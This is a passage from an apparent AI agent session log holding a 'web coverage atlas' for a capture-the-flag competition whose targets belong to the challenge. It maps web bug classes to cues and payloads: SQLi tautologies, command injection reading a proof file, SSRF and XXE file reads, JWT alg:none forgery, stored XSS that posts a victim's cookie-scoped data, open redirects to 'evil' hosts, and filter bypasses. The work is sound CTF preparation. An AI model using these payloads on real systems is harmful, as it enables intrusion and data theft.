15-17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL; methods HEAD/POST/PUT/PATCH/OPTIONS + X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, trailing ?/#. Stop at the first 200 with proof or effect.\"},\n167\t  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D03 tautology and D12 second-order are seen. Remaining: ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length/row-count oracle (bounded alphabet [0-9a-f_proof], 32 chars), time-based (sleep/randomblob) only when nothing differs, login bypass admin'--. Payloads delivered as JSON body AND query/form (D12 bound JSON only). SQLite/MySQL/Postgres dialects. Title puns to expect: \\\"yes or no\\\", \\\"takes its time\\\", \\\"union\\\".\"},\n168\t  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Numeric fields (negative, zero, huge, float), coupon/redeem replay, ~20-request parallel burst for a single-use action, reset tokens the app leaks (timestamp, md5(email), sequential). No credential guessing.\"},\n169\t  {\"id\": \"type-juggling-auth\", \"concept\": \"loose comparison / JSON type confusion in auth or token checks (row 34)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"PHP/Laravel or Node costume with a token/PIN/password compare. JSON bodies with true, 0, \\\"0\\\", [], {}, null, \\\"0e1\\\" magic hashes, arrays where strings are expected (strcmp(array) == 0), numeric strings with whitespace. Field names from the form/clues. Parser: effect+evidence / proof.\"},\n170\t  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n171\t  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n172\t  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n173\t  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Introspection query, list fields, query hidden ones (proof, secret, evidence, note) and node(id) lookups (IDOR over GraphQL); field suggestions when introspection is off.\"},\n174\t  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n175\t  {\"id\": \"upload-filter-bypass\", \"concept\": \"upload sequels: enforced type filter, served-path traversal, stored SVG/HTML (row 20b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D10's policy (txt, text/plain) was never enforced. Sequel planner over the same upload_shape (JSON filename/content/content_type, or multipart if the form says so): double extension (n.txt.html, n.html.txt), case (N.HTML), trailing dot/space, content_type spoof vs extension, GIF89a/PNG magic prefix, filename traversal (../n.html, ..%2fn.html) to land in a served dir named by the clues, SVG with script or XXE, template syntax in the content per the guide. Parser: read the returned path/url, GET it, proof regex.\"},\n176\t  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"},\n177\t  {\"id\": \"bopla-field-read\", \"concept\": \"excessive data exposure / hidden-field read on API routes (row 36)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"API-family sibling of D13 (OWASP API3 read side). For each JSON route: query ?fields=*, ?include=all, ?expand=*, ?view=admin|full|debug, ?debug=1, Accept: application/vnd.api+json, and compare the key sets against the page; also scan list endpoints for objects with keys the HTML omits (secret, proof, note, internal). Parser: proof regex after JSON flattening.\"},\n178\t  {\"id\": \"http-param-pollution\", \"concept\": \"duplicate params / keys split between proxy and app (row 35)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"For a route whose check and action read the same param: a=safe&a=evil, a[]=..., JSON duplicate keys (first vs last wins), mixed query + body copies, ; separators. Order the planner by which copy the error names. Parser: proof regex.\"},\n179\t  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"}\n180\t]\n181\t```\n182\t"}]},"parent_tool_use_id":null,"session_id":"92ce9215-30f3-4698-a3bf-8946837e3750","uuid":"c914debc-c923-46cc-869f-aef37b519e55","timestamp":"2026-10-24T13:21:03.911Z","tool_use_result":{"type":"text","file":{"filePath":"/home/testpwn/.claude/projects/-home-testpwn-huntress-2026/92ce9215-30f3-4698-a3bf-8946837e3750/tool-results/b3ls10lvk.txt","content":"# Web coverage atlas\n\nLane: a LIVE challenge-owned target per question (`targets[{id:\"Target N\", url}]`, no artifact), one `proof-N`\nquestion per target, answer = the token `proof_<32 hex>` the app prints once the bug is exploited (`trim`). One\nclassic bug per lane-day, named by a title pun: D01 exposed backup, D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path\ntraversal to `/run/huntress/objective.txt`, D05 unprotected feature route, D06 reflected XSS (server-judged \"isolated\ncallback\"), D07 stored XSS (real moderator bot), D08 session fixation, D09 CSRF (server-judged by\n`Sec-Fetch-Site: cross-site`), D10 unrestricted upload rendered by a `{{field}}` template preview, D11 SSTI\n(`?template={{objective}}`), D12 second-order SQLi (JSON plant, delayed reader), D13 mass assignment (privilege keys\nbound from a JSON profile update). Since D05 every target is the same kit: `/api/clues` names `feature_route`, often\n`secondary_route` (or `render_route`/`preferences_route`), `current_role: analyst` + zero or one concept key\n(`callback_nonce`, `moderator_data_route`/`receipt_route_template`, `session_hint`, `preview_guide`/`upload_policy`/\n`upload_shape`). D11-D13 had NO concept key: the prompt and the bare-route errors (`post_required` 405,\n`administrator_required` 403, an empty \"Rendered message\" `<pre>`) were the routing signal. Stated policies and\nechoes are costume (D09 token, D10 type rule, D13 echo hid the bound role). Success = proof regex, never `effect`\nalone (D12 prints its effect with empty rows). Mastery = today's bug + earlier lane-days (3 targets since D08),\ndescribed only by today's prompt. Pace: D01-D03 cal. 19, D04-D05 cal. 20, D06-D08 cal. 21, D09-D10 cal. 22, D11-D13\ncal. 23 -> D14-D31 (18 lane-days) over cal. 24-31, ~2-3 per day; priority 1 below = likely in D14-D21.\nArc: info-disclosure -> access control -> injection -> file read -> access control -> XSS (reflected, stored) ->\nsession fixation -> CSRF -> upload -> SSTI -> second-order SQLi -> mass assignment. Server-side/API run since D10,\neach a classic OWASP item, several \"one level deeper\" sequels of earlier days (D10->D11 templates, D03->D12 SQLi,\nD05->D13 authz). Still missing classics, most likely next: OS command injection, SSRF, XXE, JWT / signed-cookie\nforgery, role via cookie/header, open redirect, DOM XSS; then deserialization, prototype pollution, NoSQL, race,\nCORS, header trust, GraphQL, password reset, cache poisoning.\nSnapshot 2026-10-23 (after D13). `lib/web/handlers/__init__.py` holds `session_fixation`, `upload`, `csrf` (+\n`default` ladder) and loads per-day plugins `lib/web/handlers/dayNN_*.py` (each exports `KEY_MAP` + `HANDLERS`; D23\nadded `template_temper` SSTI, `ask_again_later` second-order, `posted_too_much` mass assignment). `hctf prebuild`\nstill has NO `web` lane and no `web:*` keys exist in `.run/prebuild-state.json` -> every prebuild gap is pending.\n\nStatus legend: `seen Dnn` = GM-confirmed lane-day (solver in `challenges/<cal-day>/web-*/solver/solve.py`, handler in\n`lib/web/handlers/`). `gap` = nothing reusable in lib. Prebuilt web modules must be PURE (no `urllib.request`): bodies\nin -> request plan `[(method, path, headers, body)]` out; response in -> proof or next hints. The solver fetches.\n\n## Coverage table\n\n| # | concept | status | recognition cues | first move | likelihood next 3 cal. days |\n|---|---|---|---|---|---|\n| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery x3) | robots `Disallow: /<word>-<hex>/`, \"crawler policy\", \"archive\" | robots -> index -> every link (depth 2) | done; Mastery |\n| 2 | IDOR (object-level authz) | seen D02 (Mastery x2) | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)` | foreign ids from `/api/history` | done; Mastery |\n| 3 | SQL injection (tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family + quote-balanced | done; Mastery |\n| 3b | second-order SQLi (stored value queried later) | seen D12 | \"plant your question inside the data and come back later\", \"delayed echo\", feature 405 `post_required`, secondary `{\"rows\":[],\"effect\":..}` | POST JSON every field = `x' OR '1'='1' -- `, GET secondary; `rows[]` holds proof | done; Mastery |\n| 4 | path traversal / LFI | seen D04 (Mastery) | `?doc=`/`?page=` filename value, \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |\n| 5 | missing function-level authz (unlinked route) | seen D05 (Mastery) | \"staff-only, just a sign\", clue `feature_route` | GET the clue route | done; Mastery |\n| 6 | role / privilege via client-controlled header, query or cookie | gap | `current_role: analyst` in every clue JSON, `role=` cookie, `X-Role` in errors | flip the value the app names | high (D13 did the body form) |\n| 7 | JWT tampering (`alg:none`, leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization` | decode; resign with `none` / leaked secret | high |\n| 8 | signed-cookie / session forgery (Flask, Express `s:`, base64 JSON) | gap | `session=eyJ...`, `s%3A`, base64 JSON cookie | decode; re-sign with a leaked secret | high |\n| 9 | mass assignment / over-posting | seen D13 | \"the form only asked for your name. But the API binds whatever you hand it\", \"promotion\", feature 405 `post_required`, secondary 403 `administrator_required` | POST JSON `display_name` + role/is_admin/isAdmin/admin/roles/access_level/permissions, GET secondary | done; Mastery |\n| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\", \"shell\" | `;cat /run/huntress/objective.txt`, `|`, `$()`, `%0a` | very high |\n| 11 | SSTI (expression in a rendered message) | seen D11 | \"template engine ... evaluates everything\", \"speak in expressions\", \"Rendered message\" `<pre>` | `?template={{7*7}}` -> 49, then `{{objective}}` | done; Mastery |\n| 11b | SSTI sequels: sandbox escape / file read / stored template | gap | `{{objective}}` absent or filtered, \"sandbox\", \"safe mode\", stored profile rendered later | engine fingerprint -> per-engine file read of prompt path | med |\n| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\", \"import\" | `http://127.0.0.1/<clue route>`, `file:///run/...` | very high |\n| 13a | reflected XSS (server-judged callback) | seen D06 | \"repeats everything\", \"talks back\", clue `callback_nonce` | reflect `<script>fetch(cb?nonce)`, then GET cb with Sec-Fetch-* + Referer | done; Mastery |\n| 13b | stored XSS (moderator bot) | seen D07 | \"guestbook\", \"reviewer stops by\", `moderator_data_route`, `receipt_route_template` | store fetch(data)->POST receipt script; poll entry | done; Mastery |\n| 13c | DOM XSS (`location.hash`/`search` -> `innerHTML`/`eval`) | gap | inline JS reading location, \"client-side\", \"nothing reaches the server\" | scan sinks; bot visits `#payload` URL or callback check | high |\n| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS | use the leaked pair (no brute force) | med |\n| 15 | header-trust bypass (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`) | gap | \"internal only\", \"localhost only\" | spoof the header the error names | med-high |\n| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `_method=` | other methods + overrides | med |\n| 17 | path-normalisation authz bypass | gap | 403 on a named route | `/ADMIN`, `//admin`, `/admin;/`, `%2e` | med |\n| 18 | XXE | gap | XML/SVG/DOCX upload, `application/xml`, `upload_shape` naming xml | entity on `file:///run/huntress/objective.txt` | high |\n| 19 | NoSQL injection | gap | JSON login, \"MongoDB\", \"document store\" | `{\"$ne\":null}` | med-high |\n| 20 | unrestricted upload rendered server-side | seen D10 (Mastery) | \"upload form has standards. Low ones\", `upload_shape`, `render_route`, `preview_guide` | POST JSON `{filename:x.html, content:<p>{{objective}}</p>, content_type:text/html}` -> GET returned `path` | done; Mastery |\n| 20b | upload filter bypass / served-path traversal / stored SVG-HTML XSS | gap | policy enforced (`extension_not_allowed`, magic check), `../` in filename | double ext, case, magic+type spoof, `../` filename, SVG script | med |\n| 21 | insecure deserialization | gap | cookie `gASV`/`Tzo`/`rO0`/`_$$ND_FUNC$$_` | tamper fields, then gadget | med |\n| 22 | exposed VCS / env / debug | gap | `/.git/HEAD` 200, `/.env`, DEBUG page | fetch, reconstruct, read secret | med |\n| 23 | GraphQL introspection / hidden field | gap | `/graphql`, `{\"data\":` | `__schema`, hidden fields | med |\n| 24a | CSRF (state change \"as someone else\") | seen D09 | \"obeys whoever asks nicely -- even strangers\", `preferences_route`, form with hidden `csrf_token` | submit the form's external option cross-site (Sec-Fetch-*), read `/api/preferences` | done; Mastery |\n| 24e | CSRF sequels: token bound/checked, SameSite, JSON-body CSRF via bot | gap | token rejected when absent, `SameSite=Strict`, report-to-admin URL | token from own session, text/plain JSON form, GET downgrade | low-med |\n| 24b | open redirect (incl. OAuth `redirect_uri`) | gap | `?next=`/`?return=`/`redirect_uri`, \"after login\" | redirect to a clue route / `//host`; effect JSON | high |\n| 24c | CORS misconfig (reflected Origin + credentials) | gap | `Access-Control-Allow-Origin` echoing Origin, `-Credentials: true` | request with `Origin: null` / attacker | med |\n| 24d | clickjacking / framing | gap | no X-Frame-Options/CSP frame-ancestors, \"one click\" | effect likely judged server-side by headers | low |\n| 25 | prototype pollution (Node) | gap | JSON merge \"settings\", Node/Express/NestJS banner | `{\"__proto__\":{\"isAdmin\":true}}` | med-high (D13 sibling) |\n| 26 | race condition / business logic | gap | shop / wallet / voucher, \"only once\", \"at the same time\" | parallel burst, negative values | med |\n| 27 | password-reset / predictable token / OTP | gap | \"forgot password\", token in response | read the leaked token; no brute force | med |\n| 28 | UNION / error / blind (boolean, time) SQLi | gap | numeric id, DB errors, \"only yes or no\", \"takes its time\" | `ORDER BY`, `UNION SELECT`, boolean diff | med |\n| 29 | LFI filters | partial (D04 payload set) | \"not allowed\", `.php` appended | `....//`, double-encode, `pages/../`, wrappers | med |\n| 30 | request smuggling / cache poisoning / host header | gap | proxy + cache headers, reset links using Host | `X-Forwarded-Host`, CL/TE | low |\n| 31 | session fixation (planted id adopted by victim login) | seen D08 | \"plant your session\", \"welcome mat\", clue `session_hint` | `?sid=<hint>` on feature route -> cookie on secondary | done; Mastery |\n| 32 | session hijack / weak session ids / logout not invalidating | gap | sequential or timestamp ids, ids leaked in URLs/logs | reuse a leaked id the app shows | med |\n| 33 | static web evidence (HAR, pcap, logs, web shell) | gap (never released) | `.har`, pcap magic, combined-log lines | jq / tshark / decode layers | low |\n| 34 | type juggling / loose comparison / JSON type confusion | gap | PHP/Node costume, `==` compare of token/PIN, JSON login | `true`, `0`, `[]`, `{\"$gt\":\"\"}`, `\"0e1\"` | med |\n| 35 | HTTP parameter pollution / duplicate keys | gap | same param twice, proxy + app split, \"first one wins\" | `a=1&a=2`, duplicate JSON keys, array params | low-med |\n| 36 | excessive data exposure / field-filter read (BOPLA read) | gap | API list returning more than the page shows, `?fields=`, `include=`, `expand=` | request hidden fields / `?fields=*` | med |\n| 37 | second-order sequels for other classes (stored SSTI / XSS / cmd read later) | gap | \"save now, rendered later\", profile shown on another page | plant per-class payload, read the secondary | med (D12 pattern) |\n\n## Recognition cues (worker quick-reference)\n\n```\nFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n  GET /api/clues   -> feature_route / secondary_route / current_role + ZERO or ONE concept key\n  GET each clue route BARE: the JSON error names the missing piece (session_id_required, authenticated_login_required,\n      browser_callback_required, post_required(405) = a POST sink, administrator_required(403) = privilege check)\n  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n  regex  proof_[0-9a-f]{32}  over EVERY body (JSON/base64/zip decoded). An `effect` without the proof is NOT a solve.\n  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = not ready, re-poll hctf status.\nPick routes by clue KEY (feature_/secondary_/*_data_route/*_template) and openapi paths, NEVER by the word in the\nvalue (callback|internal|status|result|audit, messages|postcards are re-dealt even between single and TT).\nNo concept key (D11-D13) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\nMASTERY: 3 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\nsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\nfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\ncallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, form + hidden csrf_token,           -> CSRF (D09)         -> submit the form's external option with Sec-Fetch-Site:\n  \"obeys whoever asks nicely -- even strangers\"             cross-site, Mode: navigate, Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route/preview_guide                -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n  \"upload form has standards. Low ones\"                     content_type:\"text/html\"} -> GET the returned path\n\"template engine evaluates\", \"speak in expressions\",   -> SSTI (D11)         -> feature?template=a${7*7}b{{7*7}}c (one probe per param:\n  empty \"Rendered message\" <pre>                            template|message|q|name|text) -> {{objective}} in the family that gave 49\n\"plant ... come back later\", \"delayed echo\",           -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"} (also\n  feature post_required, secondary {\"rows\":[]}               \"zz' OR 1=1 --\"), GET secondary after each plant -> rows[] has proof\n\"API binds whatever you hand it\", \"promotion\",         -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n  feature post_required, secondary administrator_required    admin, roles:[\"admin\"], access_level, permissions}; GET secondary\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\n\"fetch URL\", \"webhook\", \"import\"                      -> SSRF               -> http://127.0.0.1/<clue route>, file:///run/...\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\nXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\nA real victim browser exists (D07): anything \"the admin/reviewer visits\" can run your JS with their cookies; receipts\ncan land >12 s later. \"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin\nmatrix yourself. NEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11\ndid -> TT first try; D09, D10, D12, D13 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (~6-9 lane-days at the current pace). \"prebuild\" = pure python handler\n(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\ndecoy. \"note\" = harness/prompt change. \"tool\" = install. None built (no web prebuild lane). Dropped after D13:\n`ssti-engine-probe` (seen D11), `port-day22-handlers` (csrf/upload now in lib/web/handlers); mass assignment (seen\nD13) removed from `role-tamper-planner`, second-order SQLi (seen D12) from `sqli-union-blind`.\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D13: hctf/prebuild.py LANES has no `web` entry (AUTO_LANES lists 5 lanes) and .run/prebuild-state.json has no web:* keys, so no prebuild gap below can drain. lib/web/handlers/ already loads per-day plugins `dayNN_*.py` exporting KEY_MAP + HANDLERS (D23 added three) -> the writable target is a new plugin file per gap, e.g. lib/web/handlers/prebuilt_<id>.py, + tests/data/web_fixtures/. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web/handlers/prebuilt_, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web/handlers/__init__.py:_load_plugins,)}`. Fixtures = saved target responses (targets 410 after CORRECT).\"},\n  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D23: D12 and D13 TT returned solver_incomplete (41 s, 12.9 s; solve.py a stub / no handler) because the orchestrator started TT ~1 min after single CORRECT while the codify worker was still writing lib/web/handlers/day23_*.py; the live worker then hand-solved. D11's single worker wrote its plugin BEFORE submitting -> TT CORRECT first try (solve 5.2 s). Owner of hctf/ + web skill: for web, gate TT start on the codify worker (or on solver-test passing the single case), and tell the single worker to write the plugin handler (KEY_MAP + HANDLERS, generic over param/field/route words) before `hctf submit`.\"},\n  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},\n  {\"id\": \"ssrf-planner\", \"concept\": \"server-side request forgery (row 12)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"URL-taking params (url, link, src, webhook, feed, image, callback). Plan: file:///run/huntress/objective.txt, http://127.0.0.1 / localhost / 0.0.0.0 / [::1] / 2130706433 / 127.1 + the clue routes (secondary_route is often the 'internal' one), named internal ports, 169.254.169.254 only if named, redirect and @-userinfo allowlist bypasses. Parser: proof regex in the preview body.\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON still shows current_role: analyst; D13 granted admin via JSON body binding (mass assignment, seen) -- the sibling forms are untested. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|administrator|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role=admin / ?admin=1, PATCH/PUT of the profile route with the D13 privilege key set. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py.\"},\n  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web.py: concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One 